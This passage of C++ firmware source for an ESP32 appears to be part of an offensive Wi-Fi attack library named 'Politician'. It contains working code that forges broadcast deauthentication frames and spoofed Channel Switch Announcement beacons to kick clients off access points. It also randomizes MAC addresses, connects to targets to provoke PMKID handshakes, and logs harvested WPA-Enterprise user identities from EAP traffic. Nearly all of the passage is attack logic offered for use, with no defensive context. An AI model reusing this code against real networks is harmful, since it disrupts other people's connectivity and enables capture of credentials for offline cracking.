                    _fishSsidLen = sess->ssid_len; _fishChannel = sess->channel; _fishStartMs = millis();
                    _fishState = FISH_CSA_WAIT; _csaSecondBurstSent = false;
                    if (_attackMask & ATTACK_CSA) _sendCsaBurst();
                    if (_attackMask & ATTACK_DEAUTH) _sendDeauthBurst((_attackMask & ATTACK_CSA) ? _cfg.csa_deauth_count : _cfg.deauth_burst_count);
                    _probeLocked = true; _probeLockEndMs = millis() + _cfg.csa_wait_ms;
                }
            }
        }
    }
    return true;
}

void Politician::_parseEapIdentity(const uint8_t *bssid, const uint8_t *sta,
                                   const uint8_t *eapol, uint16_t len, int8_t rssi) {
    // EAP Header starts at eapol+4. Minimum needed: Code(1), Id(1), Len(2), Type(1)
    if (len < 9) return;
    
    // EAP Code Check (We want 2 = Response)
    if (eapol[4] != 0x02) return;
    
    // EAP Type Check (We want 1 = Identity)
    if (eapol[8] != 0x01) return;
    
    uint16_t eap_len = ((uint16_t)eapol[6] << 8) | eapol[7];
    if (eap_len < 5) return;
    
    // The plaintext Identity string is defined as everything after the Type byte.
    uint16_t id_len = eap_len - 5;
    
    // Safety boundary check
    if (9 + id_len > len) return;
    
    EapIdentityRecord rec;
    memset(&rec, 0, sizeof(rec));
    memcpy(rec.bssid, bssid, 6);
    memcpy(rec.client, sta, 6);
    rec.channel = _rxChannel;
    rec.rssi = rssi;
    
    uint16_t copy_len = (id_len < 64) ? id_len : 64;
    memcpy(rec.identity, eapol + 9, copy_len);
    rec.identity[copy_len] = '\0';
    
    _log("[Enterprise] Harvested Identity '%s' from %02X:%02X:%02X:%02X:%02X:%02X\n",
         rec.identity, sta[0], sta[1], sta[2], sta[3], sta[4], sta[5]);
         
    _identityCb(rec);
}

void Politician::_parseSsid(const uint8_t *ie, uint16_t ie_len, char *out, uint8_t &out_len) {
    out[0]  = '\0'; out_len = 0; uint16_t pos = 0;
    while (pos + 2 <= ie_len) {
        uint8_t tag = ie[pos]; uint8_t len = ie[pos + 1];
        if (pos + 2 + len > ie_len) break;
        if (tag == 0 && len > 0 && len <= 32) {
            memcpy(out, ie + pos + 2, len); out[len] = '\0'; out_len = len; return;
        }
        pos += 2 + len;
    }
}

uint8_t Politician::_classifyEnc(const uint8_t *ie, uint16_t ie_len) {
    bool has_rsn = false, has_wpa = false, is_enterprise = false; 
    uint16_t pos = 0;
    while (pos + 2 <= ie_len) {
        uint8_t tag = ie[pos]; uint8_t len = ie[pos + 1];
        if (pos + 2 + len > ie_len) break;
        
        if (tag == 48) {
            has_rsn = true;
            // Parse robust security network AKM
            // Format: Version(2) + GroupCipher(4) + PairwiseCipherCount(2) + PairwiseCipherList(...) + AKMCount(2) + AKMList(...)
            if (len >= 18) { // Minimum length to reach AKM count assuming 1 pairwise cipher
                uint16_t pw_count = (ie[pos+8] | (ie[pos+9] << 8));
                uint16_t akm_offset = pos + 10 + (pw_count * 4);
                
                if (akm_offset + 2 <= pos + 2 + len) {
                    uint16_t akm_count = (ie[akm_offset] | (ie[akm_offset + 1] << 8));
                    uint16_t list_offset = akm_offset + 2;
                    
                    for (int i=0; i < akm_count; i++) {
                        if (list_offset + 4 > pos + 2 + len) break;
                        // OUI: 00-0F-AC, Suite Type: 1 (802.1X)
                        if (ie[list_offset] == 0x00 && ie[list_offset+1] == 0x0F && ie[list_offset+2] == 0xAC && ie[list_offset+3] == 0x01) {
                            is_enterprise = true;
                        }
                        list_offset += 4;
                    }
                }
            }
        }
        if (tag == 221 && len >= 4 && ie[pos+2]==0x00 && ie[pos+3]==0x50 && ie[pos+4]==0xF2 && ie[pos+5]==0x01) has_wpa = true;
        pos += 2 + len;
    }
    
    if (is_enterprise) return 4;
    return has_rsn ? 3 : (has_wpa ? 2 : 0);
}

bool Politician::_detectWpa3Only(const uint8_t *ie, uint16_t ie_len) {
    uint16_t pos = 0;
    while (pos + 2 <= ie_len) {
        uint8_t tag = ie[pos];
        uint8_t len = ie[pos + 1];
        if (pos + 2 + len > ie_len) break;

        if (tag == 48 && len >= 10) { // RSN IE
            uint16_t pw_count   = ie[pos + 8] | (ie[pos + 9] << 8);
            uint16_t akm_offset = pos + 10 + (pw_count * 4);
            if (akm_offset + 2 > pos + 2 + len) { pos += 2 + len; continue; }

            uint16_t akm_count = ie[akm_offset] | (ie[akm_offset + 1] << 8);
            uint16_t list_off  = akm_offset + 2;

            bool has_sae     = false;
            bool has_wpa2psk = false;
            for (uint16_t i = 0; i < akm_count; i++) {
                if (list_off + 4 > pos + 2 + len) break;
                if (ie[list_off] == 0x00 && ie[list_off+1] == 0x0F && ie[list_off+2] == 0xAC) {
                    if (ie[list_off+3] == 0x02) has_wpa2psk = true; // WPA2-PSK
                    if (ie[list_off+3] == 0x08) has_sae     = true; // SAE (WPA3)
                }
                list_off += 4;
            }

            // MFPR = bit 6 of RSN Capabilities
            bool mfpr = false;
            if (list_off + 2 <= pos + 2 + len) {
                uint16_t caps = ie[list_off] | (ie[list_off + 1] << 8);
                mfpr = (caps & 0x0040) != 0;
            }

            if ((has_sae && !has_wpa2psk) || mfpr) return true;
        }
        pos += 2 + len;
    }
    return false;
}

Politician::Session* Politician::_findSession(const uint8_t *bssid, const uint8_t *sta) {
    for (int i = 0; i < MAX_SESSIONS; i++) {
        if (_sessions[i].active && memcmp(_sessions[i].bssid, bssid, 6) == 0 && memcmp(_sessions[i].sta, sta, 6) == 0) return &_sessions[i];
    }
    return nullptr;
}

Politician::Session* Politician::_createSession(const uint8_t *bssid, const uint8_t *sta) {
    for (int i = 0; i < MAX_SESSIONS; i++) {
        if (!_sessions[i].active) {
            memset(&_sessions[i], 0, sizeof(Session));
            memcpy(_sessions[i].bssid, bssid, 6); memcpy(_sessions[i].sta, sta, 6);
            _sessions[i].active = true; _sessions[i].created_ms = millis();
            _lookupSsid(bssid, _sessions[i].ssid, _sessions[i].ssid_len);
            return &_sessions[i];
        }
    }
    uint32_t oldest_ms = UINT32_MAX; int oldest_idx = 0;
    for (int i = 0; i < MAX_SESSIONS; i++) {
        if (_sessions[i].created_ms < oldest_ms) { oldest_ms = _sessions[i].created_ms; oldest_idx = i; }
    }
    memset(&_sessions[oldest_idx], 0, sizeof(Session));
    memcpy(_sessions[oldest_idx].bssid, bssid, 6); memcpy(_sessions[oldest_idx].sta, sta, 6);
    _sessions[oldest_idx].active = true; _sessions[oldest_idx].created_ms = millis();
    _lookupSsid(bssid, _sessions[oldest_idx].ssid, _sessions[oldest_idx].ssid_len);
    return &_sessions[oldest_idx];
}

void Politician::_cacheAp(const uint8_t *bssid, const char *ssid, uint8_t ssid_len,
                           uint8_t enc, uint8_t channel, bool is_wpa3_only) {
    for (int i = 0; i < MAX_AP_CACHE; i++) {
        if (_apCache[i].active && memcmp(_apCache[i].bssid, bssid, 6) == 0) {
            memcpy(_apCache[i].ssid, ssid, ssid_len + 1); _apCache[i].ssid_len = ssid_len;
            _apCache[i].enc = enc; _apCache[i].channel = channel; 
            _apCache[i].is_wpa3_only = is_wpa3_only; 
            return;
        }
    }
    int slot = _apCacheCount % MAX_AP_CACHE;
    _apCache[slot].active = true; _apCache[slot].last_probe_ms = 0;
    _apCache[slot].last_stimulate_ms = 0;
    memcpy(_apCache[slot].bssid, bssid, 6); memcpy(_apCache[slot].ssid, ssid, ssid_len + 1);
    _apCache[slot].ssid_len = ssid_len; _apCache[slot].enc = enc; _apCache[slot].channel = channel;
    _apCache[slot].is_wpa3_only = is_wpa3_only;
    _apCacheCount++;
}

bool Politician::_lookupSsid(const uint8_t *bssid, char *out_ssid, uint8_t &out_len) {
    for (int i = 0; i < MAX_AP_CACHE; i++) {
        if (_apCache[i].active && memcmp(_apCache[i].bssid, bssid, 6) == 0) {
            memcpy(out_ssid, _apCache[i].ssid, _apCache[i].ssid_len + 1); out_len = _apCache[i].ssid_len; return true;
        }
    }
    out_ssid[0] = '\0'; out_len = 0; return false;
}

bool Politician::_lookupEnc(const uint8_t *bssid, uint8_t &out_enc) {
    for (int i = 0; i < MAX_AP_CACHE; i++) {
        if (_apCache[i].active && memcmp(_apCache[i].bssid, bssid, 6) == 0) {
            out_enc = _apCache[i].enc; return true;
        }
    }
    out_enc = 0; return false;
}

bool Politician::_isCaptured(const uint8_t *bssid) const {
    for (int i = 0; i < _ignoreCount; i++) if (memcmp(_ignoreList[i], bssid, 6) == 0) return true;
    for (int i = 0; i < MAX_CAPTURED; i++) if (_captured[i].active && memcmp(_captured[i].bssid, bssid, 6) == 0) return true;
    return false;
}

void Politician::_sendDeauthBurst(uint8_t count) {
    uint8_t deauth[26] = {
        0xC0, 0x00, 0x00, 0x00, // Frame Control (Deauth), Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // DA (Broadcast to all clients)
        _fishBssid[0], _fishBssid[1], _fishBssid[2], _fishBssid[3], _fishBssid[4], _fishBssid[5], // SA (Spoofed AP)
        _fishBssid[0], _fishBssid[1], _fishBssid[2], _fishBssid[3], _fishBssid[4], _fishBssid[5], // BSSID (Spoofed AP)
        0x00, 0x00, // Seq
        0x07, 0x00  // Reason 7: Class 3 frame received from nonassociated STA
    };

    for (int i = 0; i < count; i++) {
        deauth[22] = (i << 4) & 0xFF; // Increment sequence number roughly
        esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(deauth), false);
        delay(2);
    }
    _log("[Deauth] Sent Reason 7 burst on ch%d\n", _fishChannel);
}

void Politician::_markCapturedSsidGroup(const char *ssid, uint8_t ssid_len) {
    if (ssid_len == 0) return;
    for (int i = 0; i < MAX_AP_CACHE; i++) {
        if (!_apCache[i].active || _apCache[i].ssid_len != ssid_len || memcmp(_apCache[i].ssid, ssid, ssid_len) != 0) continue;
        if (!_isCaptured(_apCache[i].bssid)) _markCaptured(_apCache[i].bssid);
    }
}

void Politician::_markCaptured(const uint8_t *bssid) {
    if (_isCaptured(bssid)) return;
    int slot = _capturedCount % MAX_CAPTURED;
    _captured[slot].active = true; memcpy(_captured[slot].bssid, bssid, 6); _capturedCount++;
    _log("[Cap] Marked %02X:%02X:%02X:%02X:%02X:%02X\n", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
}

void Politician::_expireSessions(uint32_t timeoutMs) {
    uint32_t now = millis();
    for (int i = 0; i < MAX_SESSIONS; i++) if (_sessions[i].active && (now - _sessions[i].created_ms) > timeoutMs) _sessions[i].active = false;
}

void Politician::_randomizeMac() {
    uint8_t mac[6]; uint32_t r1 = esp_random(), r2 = esp_random();
    mac[0] = (uint8_t)((r1 & 0xFE) | 0x02); mac[1] = (uint8_t)(r1 >> 8); mac[2] = (uint8_t)(r1 >> 16);
    mac[3] = (uint8_t)(r2); mac[4] = (uint8_t)(r2 >> 8); mac[5] = (uint8_t)(r2 >> 16);
    esp_wifi_set_mac(WIFI_IF_STA, mac); memcpy(_ownStaMac, mac, 6);
    _log("[Fish] MAC → %02X:%02X:%02X:%02X:%02X:%02X\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

void Politician::_startFishing(const uint8_t *bssid, const char *ssid, uint8_t ssid_len, uint8_t channel) {
    if (_fishState != FISH_IDLE) return;
    _randomizeMac(); esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE); _channel = channel;
    wifi_config_t sta_cfg = {}; memcpy(sta_cfg.sta.ssid, ssid, ssid_len);
    memcpy(sta_cfg.sta.password, "WiFighter00", 11); sta_cfg.sta.bssid_set = true; memcpy(sta_cfg.sta.bssid, bssid, 6);
    esp_wifi_set_config(WIFI_IF_STA, &sta_cfg); esp_wifi_connect();
    memcpy(_fishBssid, bssid, 6); memcpy(_fishSsid, ssid, ssid_len); _fishSsid[ssid_len] = '\0';
    _fishSsidLen = ssid_len; _fishChannel = channel; _fishStartMs = millis();
    _fishState = FISH_CONNECTING; _fishRetry = 0; _fishAuthLogged = false; _fishAssocLogged = false;
    _probeLocked = true; _probeLockEndMs = millis() + _cfg.fish_timeout_ms;
    _log("[Fish] → %02X:%02X:%02X:%02X:%02X:%02X SSID=%.*s\n", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], ssid_len, ssid);
}

void Politician::_sendCsaBurst() {
    uint8_t frame[100]; int p = 0;
    frame[p++] = 0x80; frame[p++] = 0x00; frame[p++] = 0x00; frame[p++] = 0x00;
    for (int i = 0; i < 6; i++) frame[p++] = 0xFF; memcpy(frame + p, _fishBssid, 6); p += 6; memcpy(frame + p, _fishBssid, 6); p += 6;
    frame[p++] = 0x00; frame[p++] = 0x00; memset(frame + p, 0, 8); p += 8;
    frame[p++] = 0x64; frame[p++] = 0x00; frame[p++] = 0x31; frame[p++] = 0x04;
    frame[p++] = 0x00; frame[p++] = _fishSsidLen; memcpy(frame + p, _fishSsid, _fishSsidLen); p += _fishSsidLen;
    frame[p++] = 0x03; frame[p++] = 0x01; frame[p++] = _fishChannel;
    frame[p++] = 0x25; frame[p++] = 0x03; frame[p++] = 0x01; frame[p++] = 0x0E; frame[p++] = 0x01;
    for (int i = 0; i < _cfg.csa_beacon_count; i++) { esp_wifi_80211_tx(WIFI_IF_AP, frame, p, false); delay(15); }
    _log("[CSA] Sent burst on ch%d\n", _fishChannel);
}

void Politician::_processFishing() {
    if (_fishState == FISH_IDLE) return;
    if (_fishState == FISH_CSA_WAIT) {
        if (_isCaptured(_fishBssid)) { _fishState = FISH_IDLE; _probeLocked = false; _lastHopMs = millis(); _log("[CSA] Captured!\n"); return; }
        if (!_csaSecondBurstSent && (millis() - _fishStartMs > 2000)) {
            _csaSecondBurstSent = true;
            if (_attackMask & ATTACK_CSA) _sendCsaBurst();
            if (_attackMask & ATTACK_DEAUTH) _sendDeauthBurst(_cfg.csa_deauth_count);
            _log("[CSA] Burst 2\n");
        }
        if (millis() >= _probeLockEndMs) {
            _fishState = FISH_IDLE; _probeLocked = false; _lastHopMs = millis();
            _log("[CSA] Wait expired\n");
            if (_attackResultCb) {
                AttackResultRecord r; memset(&r, 0, sizeof(r));
                memcpy(r.bssid, _fishBssid, 6); memcpy(r.ssid, _fishSsid, _fishSsidLen + 1); r.ssid_len = _fishSsidLen;
                r.result = RESULT_CSA_EXPIRED; _attackResultCb(r);
            }
        }
        return;
    }
    if (_isCaptured(_fishBssid)) { esp_wifi_disconnect(); _fishState = FISH_IDLE; _probeLocked = false; _lastHopMs = millis(); _log("[Fish] Captured!\n"); return; }
    if (millis() >= _probeLockEndMs) {
        esp_wifi_disconnect();
        if (_fishRetry < _cfg.fish_max_retries) {
            _fishRetry++; _log("[Fish] Timeout retry %d\n", _fishRetry); _randomizeMac();
            _probeLockEndMs = millis() + _cfg.fish_timeout_ms; _fishAuthLogged = false; _fishAssocLogged = false; esp_wifi_connect(); return;
        }
        if (_attackMask & ATTACK_CSA) {
            _log("[Attack] Switching to CSA\n"); esp_wifi_set_channel(_fishChannel, WIFI_SECOND_CHAN_NONE);
            _sendCsaBurst();
            if (_attackMask & ATTACK_DEAUTH) _sendDeauthBurst(_cfg.csa_deauth_count);
            _fishState = FISH_CSA_WAIT; _probeLocked = true; _probeLockEndMs = millis() + _cfg.csa_wait_ms; _csaSecondBurstSent = false;
        } else {
            _fishState = FISH_IDLE; _probeLocked = false; _lastHopMs = millis();
            _log("[Fish] Exhausted\n");
            if (_attackResultCb) {
                AttackResultRecord r; memset(&r, 0, sizeof(r));
                memcpy(r.bssid, _fishBssid, 6); memcpy(r.ssid, _fishSsid, _fishSsidLen + 1); r.ssid_len = _fishSsidLen;
                r.result = RESULT_PMKID_EXHAUSTED; _attackResultCb(r);
            }
        }
    }
}

} // namespace politician
